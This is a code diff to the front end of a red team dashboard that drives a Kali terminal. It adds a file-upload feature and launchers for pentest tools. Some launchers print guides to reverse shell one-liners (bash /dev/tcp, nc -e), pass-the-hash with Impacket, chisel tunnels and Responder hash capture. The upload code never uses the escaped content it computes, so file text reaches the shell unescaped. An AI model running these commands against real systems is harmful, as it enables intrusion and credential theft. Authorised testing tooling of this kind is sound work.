@@ -248,6 +248,40 @@ document.addEventListener('DOMContentLoaded', () => {
         showToast('✕ Terminal cleared');
     };
 
+    // ── File Upload to Kali ──
+    window.handleFileUpload = function (input) {
+        const file = input.files && input.files[0];
+        if (!file) return;
+        const status = document.getElementById('file-upload-status');
+        status.textContent = `📄 ${file.name} (${(file.size / 1024).toFixed(1)} KB)...`;
+
+        const reader = new FileReader();
+        reader.onload = function (e) {
+            const content = e.target.result;
+            // Escape single quotes for the heredoc
+            const safe = content.replace(/'/g, `'\\''`);
+            const filename = file.name.replace(/[^a-zA-Z0-9._-]/g, '_');
+            const cmd = `cat > /tmp/${filename} << 'EOF'\n${content}\nEOF`;
+            appendOutput(`\n▶ Uploading "${file.name}" to /tmp/${filename}...`);
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(cmd);
+                status.textContent = `✅ ${file.name} uploaded to /tmp/`;
+                showToast(`📁 Uploaded ${file.name} to Kali`);
+            } else {
+                // No SSH — just show in terminal
+                appendOutput(`[!] Not connected to Kali. Content shown below:\n${'-'.repeat(40)}\n${content}\n${'-'.repeat(40)}`);
+                status.textContent = `⚠️  Offline — shown in terminal`;
+            }
+            // Reset input so same file can be re-uploaded
+            input.value = '';
+        };
+        reader.onerror = function () {
+            status.textContent = '⚠️ Error reading file';
+            input.value = '';
+        };
+        reader.readAsText(file);
+    };
+
     window.appendBanner = function () {
         appendOutput('');
         appendOutput('  ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗ ███████╗');
@@ -257,7 +291,7 @@ document.addEventListener('DOMContentLoaded', () => {
         appendOutput('   ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗');
         appendOutput('    ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝');
         appendOutput('  ───────────────────────────────────────────────────────────────────────────────');
-        appendOutput('  🌐 Red Team Dashboard  |  🔗 vulnforge.local  |  ⚡ 24 modules loaded');
+        appendOutput('  🌐 Red Team Dashboard  |  🔗 vulnforge.local  |  ⚡ 36 modules loaded');
         appendOutput('  ───────────────────────────────────────────────────────────────────────────────');
         appendOutput('');
     };
@@ -453,10 +487,10 @@ document.addEventListener('DOMContentLoaded', () => {
     window.launchTool = function (tool) {
         const target = targetInput.value.trim();
         const needsTarget = [
-            'gobuster','dirb','wfuzz','ffuf','nikto','whatweb','wpscan',
-            'nmap','masscan','netcat','dnsrecon',
-            'enum4linux','smbclient',
-            'hydra-ssh','hydra-ftp','sqlmap'
+            'gobuster','dirb','wfuzz','ffuf','feroxbuster','nikto','whatweb','wpscan',
+            'nmap','masscan','netcat','dnsrecon','curl',
+            'enum4linux','smbclient','evil-winrm','impacket',
+            'hydra-ssh','hydra-ftp','sqlmap','responder'
         ];
         if (needsTarget.includes(tool) && !target) {
             alert('⚠️  Enter a target IP/domain in the "Target_" field first.');
@@ -484,6 +518,10 @@ document.addEventListener('DOMContentLoaded', () => {
             case 'ffuf':
                 command = `ffuf -w /usr/share/wordlists/dirb/common.txt -u http://${target}/FUZZ`;
                 description = 'Ffuf — fast web fuzzer';
+                break;
+            case 'feroxbuster':
+                command = `feroxbuster -u http://${target} -w /usr/share/wordlists/dirb/common.txt -t 50 --depth 4 --quiet`;
+                description = 'Feroxbuster — directory scan (Rust)';
                 break;
             case 'nikto':
                 command = `nikto -h http://${target}`;
@@ -515,6 +553,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 command = `dnsrecon -d ${target}`;
                 description = 'Dnsrecon — DNS enumeration';
                 break;
+            case 'curl':
+                command = `curl -s -I -L --user-agent "Mozilla/5.0" http://${target}`;
+                description = 'Curl — HTTP headers + redirects';
+                break;
 
             // ── SMB / Windows ──
             case 'enum4linux':
@@ -525,6 +567,14 @@ document.addEventListener('DOMContentLoaded', () => {
                 command = `smbclient -L //${target} -N`;
                 description = 'Smbclient — list SMB shares (null session)';
                 break;
+            case 'evil-winrm':
+                command = `echo "Usage:\nevil-winrm -i ${target} -u <user> -p <pass>\nevil-winrm -i ${target} -u <user> -H <hash>\n\n# With kerberos:\nevil-winrm -i ${target} -r <domain> -u <user>@<domain> -p <pass>"`;
+                description = 'Evil-WinRM — WinRM shell';
+                break;
+            case 'impacket':
+                command = `echo "╔═ Impacket Suite ═╗\n\npsexec.py <dom>/<user>:<pass>@${target}\nsmbexec.py <dom>/<user>:<pass>@${target}\nwmiexec.py <dom>/<user>:<pass>@${target}\n\n# Pass-the-hash\npsexec.py <dom>/<user>@${target} -hashes LM:NTLM"`;
+                description = 'Impacket — psexec/smbexec/wmiexec';
+                break;
 
             // ── Pivoting ──
             case 'ligolo':
@@ -534,6 +584,14 @@ document.addEventListener('DOMContentLoaded', () => {
             case 'nc-listener':
                 command = `echo "╔════════════════════════════════════════╗\n║  Netcat Listener — Reverse Shell      ║\n╚════════════════════════════════════════╝\n\n[Kali] rlwrap nc -lvnp 4444\n\n[Target Bash] bash -i >& /dev/tcp/${target}/4444 0>&1\n[Target NC] nc -e /bin/sh ${target} 4444\n\n⚠️  Run the listener in a separate terminal."`;
                 description = 'NC Listener — reverse shell guide';
+                break;
+            case 'chisel-client':
+                command = `echo "╔═ Chisel Tunnel ═╗\n\n# Server (your Kali):\nchisel server -p 8000 --reverse\n\n# Client (target):\nchisel client ${target}:8000 R:8080:localhost:3000\n\n# Socks proxy:\nchisel client ${target}:8000 R:1080:socks"`;
+                description = 'Chisel Client — TCP tunnel guide';
+                break;
+            case 'proxychains':
+                command = `echo "╔═ Proxychains Guide ═╗\n\n# 1. Edit /etc/proxychains4.conf:\n#    socks4 127.0.0.1 9050\n#    http   127.0.0.1 8080\n\n# 2. Start your proxy (e.g. chisel, ssh -D):\nssh -D 9050 user@${target}\n\n# 3. Run through proxy:\nproxychains nmap -sT -Pn 10.0.0.1\nproxychains smbclient -L //10.0.0.2\nproxychains curl http://10.0.0.3:80"`;
+                description = 'Proxychains — proxy chain guide';
                 break;
 
             // ── Crypto / Decode ──
@@ -588,6 +646,40 @@ document.addEventListener('DOMContentLoaded', () => {
             case 'searchsploit':
                 command = `searchsploit ${target} 2>/dev/null || echo "[!] No results for: ${target}"`;
                 description = 'Searchsploit — exploit search';
+                break;
+            case 'responder':
+                command = `echo "╔═ Responder Guide ═╗\n\n# Start LLMNR/NBT-NS poisoner:\nsudo responder -I eth0 -dwv\n\n# To capture hashes on the network:\n# Target will try to resolve a non-existent host\n# Hashes captured in /usr/share/responder/logs/\n\n# Crack with john:\nsudo john /usr/share/responder/logs/*.txt --wordlist=/usr/share/wordlists/rockyou.txt"`;
+                description = 'Responder — LLMNR/NBT-NS poisoning';
+                break;
+
+            // ── Extract / Compress ──
+            case 'unzip':
+                command = 'echo "Usage:\nunzip file.zip -d output_dir\nunzip -l file.zip       # list contents\nunzip -p file.zip | cat  # pipe to stdout"';
+                description = 'Unzip — extract .zip archives';
+                break;
+            case 'tar-gz':
+                command = 'echo "Usage:\ntar -xzvf archive.tar.gz\ntar -xzvf archive.tgz\ntar -czvf archive.tar.gz /path/to/dir   # create"';
+                description = 'Tar.gz — extract .tar.gz / .tgz';
+                break;
+            case 'tar-xz':
+                command = 'echo "Usage:\ntar -xJvf archive.tar.xz\ntar -cJvf archive.tar.xz /path/to/dir   # create"';
+                description = 'Tar.xz — extract .tar.xz';
+                break;
+            case '7z-extract':
+                command = 'echo "Usage:\n7z x file.7z\n7z l file.7z        # list contents\n7z a archive.7z /path   # create archive"';
+                description = '7z — extract .7z archives';
+                break;
+            case 'unrar':
+                command = 'echo "Usage:\nunrar x file.rar     # extract with full path\nunrar e file.rar     # extract without paths\nunrar l file.rar     # list contents"';
+                description = 'Unrar — extract .rar archives';
+                break;
+            case 'gunzip':
+                command = 'echo "Usage:\ngunzip file.gz\ngunzip -k file.gz   # keep original\ngzip -d file.gz     # same as gunzip"';
+                description = 'Gunzip — decompress .gz files';
+                break;
+            case 'bunzip2':
+                command = 'echo "Usage:\nbunzip2 file.bz2\nbunzip2 -k file.bz2  # keep original\nbzip2 -d file.bz2   # same as bunzip2"';
+                description = 'Bunzip2 — decompress .bz2 files';
                 break;
 
             default:
